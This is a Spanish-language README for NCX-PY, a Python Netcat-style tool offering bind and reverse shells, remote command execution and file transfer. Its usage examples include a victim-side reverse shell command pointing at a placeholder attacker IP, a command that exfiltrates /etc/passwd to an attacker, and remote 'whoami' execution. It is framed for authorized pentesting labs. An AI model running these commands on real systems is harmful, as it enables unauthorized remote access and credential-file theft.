# NCX-PY — TCP/UDP Navaja suiza

## Descripcion General
NCX-PY es una implementacion modular en Python de una herramienta estilo Netcat,
evolucionada desde una base de un libro hacia un diseño orientado a objetos con
principio de responsabilidad unica. Permite establecer conexiones TCP bidireccionales,
actuar como servidor a la escucha, ejecutar comandos del sistema operativo de forma
remota, transferir archivos y levantar shells inversas, mediante manipulacion directa
de sockets e hilos de ejecucion concurrente.

## Novedades de la v2
- Refactor completo a POO: `SocketConnection`, `CommandExecutor`, `FileManager` y
  `Orchestrator`, cada una con una responsabilidad unica.
- Soporte de Reverse Shell (`--reverse`), ademas del Bind Shell clasico.
- Banner de identificacion de la herramienta al iniciar.
- Correccion de bugs de la version original (nombres de atributos, `bind` vs `blind`,
  uso de `sock` en vez del modulo `socket`, import de `os` faltante).

## Caracteristicas Principales
- Modo Servidor y Modo Cliente unificados bajo una misma interfaz de comandos.
- Modo Bind Shell y Modo Reverse Shell.
- Soporte para multiples conexiones concurrentes utilizando hilos (threading).
- Ejecucion segura de procesos del sistema operativo mediante `subprocess` y `shlex`.
- Capacidad de shell interactivo completo enviando comandos y recibiendo flujos de bytes.
- Transferencia y almacenamiento de archivos (upload/download/serve-file).
- Reutilizacion de puertos mediante `SO_REUSEADDR`.

## Requisitos del Sistema
- Python 3.8 o superior.
- Sistema operativo compatible con interfaces de red TCP/IP (Linux, macOS, Windows).

## Uso y Ejemplos

    python ncx.py --help

1. Servidor interactivo de comandos (Bind Shell):
    python ncx.py -t 0.0.0.0 -p 5555 -l -c

2. Reverse Shell:
    Atacante > python ncx.py -l -p 4444
    Victima  > python ncx.py -t <IP_ATACANTE> -p 4444 --reverse

3. Servidor para recibir un archivo:
    python ncx.py -t 0.0.0.0 -p 5555 -l -u archivo_destino.txt

4. Ejecutar un comando unico de forma remota al conectar:
    python ncx.py -t 192.168.1.108 -p 5555 -e "whoami"

5. Exfiltrar un archivo de la víctima:
    Victima  > python ncx.py -l -p 5555 --serve-file /etc/passwd
    Atacante > python ncx.py -t 192.168.1.108 -p 5555 --download robado.txt

6. Conectarse como cliente interactivo:
    python ncx.py -t 192.168.1.108 -p 5555

## Aviso
Herramienta de uso exclusivo en entornos de laboratorio o engagements de pentesting
autorizados. El uso contra sistemas sin consentimiento explícito es ilegal.
